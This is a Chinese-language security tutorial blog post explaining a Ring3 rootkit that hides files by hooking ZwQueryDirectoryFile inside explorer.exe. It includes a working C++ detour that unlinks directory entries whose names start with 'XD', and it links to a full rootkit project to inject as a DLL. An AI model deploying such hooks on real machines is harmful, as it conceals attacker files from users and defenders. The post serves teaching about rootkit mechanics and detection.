# 【Day 14】Explorer 你怎麼沒感覺 - Ring3 Rootkit 隱藏檔案

## 環境
* Windows 10 21H1
* Visual Studio 2019

## 前情提要
在[【Day 06】致不滅的 DLL - DLL Injection](https://ithelp.ithome.com.tw/articles/10268768)、[【Day 09】Hook 的奇妙冒險 - Ring3 Hook](https://ithelp.ithome.com.tw/articles/10270919) 我們分別認識了基本的 DLL Injection 和 Hook；在[【Day 13】粗暴後門，Duck 不必 - Windows 簡單後門](https://ithelp.ithome.com.tw/articles/10273669)也認識了後門的存在用途。

之前介紹過，後門是個用來維持權限的手法，讓駭客可以更方便的再次進入受害主機。但是單純的後門可能很容易被發現，所以通常 Rootkit 會需要一些方法躲避偵測。這篇文章將說明 Ring3 Rootkit 的其中一個功能，把存在的檔案隱藏，讓 Explorer 瞎掉。

## Explorer 做了什麼
大家使用 Windows 時，有沒有想過為什麼能看得到桌面、檔案的 Icon 等等，是誰在這所有人都覺得理所當然的 UI 介面後默默付出呢？主角就是 Explorer 這個 Process。

之前聽過一個整人技巧，就是把 Explorer 這個 Process 砍掉。在 cmd 上打以下指令，然後就會看不到桌面和檔案。
```
:: 請在虛擬機上做
# tasklist | find "explorer"
explorer.exe 1656 Console 2 138,028 K

:: 輸入完這行會看不到桌面
# taskkill /pid /f 1656

:: 要復原的話就再開啟 Explorer
# explorer
```

那 Explorer 是怎麼做到把檔案列舉出來的呢？其實 Explorer 這個 Process 使用了定義在 ntdll.dll 的 [ZwQueryDirectoryFile](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-zwquerydirectoryfile) 函數，它會提供檔案結構讓程式可以訪問它，接著使用者就能看到目錄中有哪些檔案了。所以只要能夠竄改這個檔案結構，就能夠達到隱藏檔案的效果。

## 分析檔案結構
仔細看一下 ZwQueryDirectoryFile 這個函數原型。其中的 FileInformation 就存放著檔案結構，長度為 Length。FileInformation 不只一種型態，而是會根據 FileInformationClass 的不同改變，因此在竄改 FileInformation 時，也需要注意 FileInformationClass。
```
NTSYSAPI NTSTATUS ZwQueryDirectoryFile(
  HANDLE                 FileHandle,
  HANDLE                 Event,
  PIO_APC_ROUTINE        ApcRoutine,
  PVOID                  ApcContext,
  PIO_STATUS_BLOCK       IoStatusBlock,
  PVOID                  FileInformation,
  ULONG                  Length,
  FILE_INFORMATION_CLASS FileInformationClass,
  BOOLEAN                ReturnSingleEntry,
  PUNICODE_STRING        FileName,
  BOOLEAN                RestartScan
);
```

以 [FILE_DIRECTORY_INFORMATION](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/ns-ntifs-_file_directory_information) 為例，它的函數原型如下。第一個參數 NextEntryOffset 存放著目前這個 Entry 到下一個 Entry 的距離，而每個 Entry 都會是一個 FILE_DIRECTORY_INFORMATION。我們可以透過最後一個參數 FileName 來判斷目前這個檔案是不是我們要隱藏的。
```
typedef struct _FILE_DIRECTORY_INFORMATION {
  ULONG         NextEntryOffset;
  ULONG         FileIndex;
  LARGE_INTEGER CreationTime;
  LARGE_INTEGER LastAccessTime;
  LARGE_INTEGER LastWriteTime;
  LARGE_INTEGER ChangeTime;
  LARGE_INTEGER EndOfFile;
  LARGE_INTEGER AllocationSize;
  ULONG         FileAttributes;
  ULONG         FileNameLength;
  WCHAR         FileName[1];
} FILE_DIRECTORY_INFORMATION, *PFILE_DIRECTORY_INFORMATION;
```

## 隱藏檔案的原理
目前已經知道檔案的結構是 FileInformation，其中一個一個 Entry 以 NextEntryOffset 的方式串在一起，下圖簡單示意。
![](https://i.imgur.com/trWG7Rd.png)

如果現在要隱藏的是 File 3，那就把 File 3 這個 Entry 的位址改成 File 4 這個 Entry，示意圖如下。
![](https://i.imgur.com/Ytp0ugk.png)


## 實作
### 實作流程
首先先 Hook ZwQueryDirectoryFile，竄改成我們自己定義的 DetourZwQueryDirectoryFile，實作過程跟[【Day 09】Hook 的奇妙冒險 - Ring3 Hook](https://ithelp.ithome.com.tw/articles/10270919) 大同小異，這邊不贅述，這篇重點放在 DetourZwQueryDirectoryFile 的部分。

1. 呼叫原本的 ZwQueryDirectoryFile，取得檔案結構
2. 確認是不是目標的 FileInformationClass
3. 透過檔名判斷是不是要隱藏的檔案
4. 要隱藏的檔案，就把目前的 Entry 竄改成下一個 Entry。如果已經是最後一個檔案了，就把上一個 Entry 的 NextEntryOffset 改成 0
5. 不隱藏的檔案，就加上 NextEntryOffset 繼續判斷下一個檔案，直到 NextEntryOffset 等於 0 為止

### POC
這裡截取關鍵程式片段，完整的程式專案可以參考我的 GitHub [zeze-zeze/2021iThome](https://github.com/zeze-zeze/2021iThome/tree/master/Explorer%E4%BD%A0%E6%80%8E%E9%BA%BC%E6%B2%92%E6%84%9F%E8%A6%BA/Rootkit)。
```cpp=
// 竄改原始的 ZwQueryDirectoryFile，隱藏檔名中有 "XD" 字串的檔案
NTSTATUS DetourZwQueryDirectoryFile(
    HANDLE                 FileHandle,
    HANDLE                 Event,
    PIO_APC_ROUTINE        ApcRoutine,
    PVOID                  ApcContext,
    PIO_STATUS_BLOCK       IoStatusBlock,
    PVOID                  FileInformation,
    ULONG                  Length,
    FileInformationClassEx FileInformationClass,
    BOOLEAN                ReturnSingleEntry,
    PUNICODE_STRING        FileName,
    BOOLEAN                RestartScan
) {
    // 1. 呼叫原本的 ZwQueryDirectoryFile，取得檔案結構
    NTSTATUS status = fpZwQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
    
    // 2. 確認是不是目標的 FileInformationClass
    if (NT_SUCCESS(status) && (FileInformationClass == FileInformationClassEx::FileDirectoryInformation || FileInformationClass == FileInformationClassEx::FileFullDirectoryInformation || FileInformationClass == FileInformationClassEx::FileIdFullDirectoryInformation || FileInformationClass == FileInformationClassEx::FileBothDirectoryInformation || FileInformationClass == FileInformationClassEx::FileIdBothDirectoryInformation || FileInformationClass == FileInformationClassEx::FileNamesInformation)) {
        PVOID pCurrent = FileInformation;
        PVOID pPrevious = NULL;
        do {
            // 3. 透過檔名判斷是不是要隱藏的檔案
            if (wstring(GetFileDirEntryFileName(pCurrent, FileInformationClass)).find(L"XD") == 0) {
                // 4. 要隱藏的檔案，就把目前的 Entry 竄改成下一個 Entry
                ULONG nextEntryOffset = GetFileNextEntryOffset(pCurrent, FileInformationClass);
                if (nextEntryOffset != 0) {
                    int bytes = (DWORD)Length - ((ULONG)pCurrent - (ULONG)FileInformation) - nextEntryOffset;
                    RtlCopyMemory((PVOID)pCurrent, (PVOID)((char*)pCurrent + nextEntryOffset), (DWORD)bytes);
                }
                // 如果已經是最後一個檔案了，就把上一個 Entry 的 NextEntryOffset 改成 0
                else {
                    if (pCurrent == FileInformation)status = 0;
                    else SetFileNextEntryOffset(pPrevious, FileInformationClass, 0);
                    break;
                }
            }
            else {
                // 5. 不隱藏的檔案，就加上 NextEntryOffset 繼續判斷下一個檔案，直到 NextEntryOffset 等於 0 為止
                pPrevious = pCurrent;
                pCurrent = (BYTE*)pCurrent + GetFileNextEntryOffset(pCurrent, FileInformationClass);
            }
        } while (GetFileNextEntryOffset(pPrevious, FileInformationClass) != 0);
    }
    return status;
}
```

### 實際測試
由於這只是個 DLL，還需要一個 DLL Injector 實作 DLL Injection 注入到 explorer.exe 中，可以參考[【Day 06】致不滅的 DLL - DLL Injection](https://ithelp.ithome.com.tw/articles/10268768) 或是用 Cheat Engine 也行。

注入 explorer.exe 之後，會發現檔案名稱有 "XD" 字串的檔案消失了，要回復的話就把 Explorer Process 砍掉重開。

## 參考資料
* [r77-rootkit](https://github.com/bytecode77/r77-rootkit)
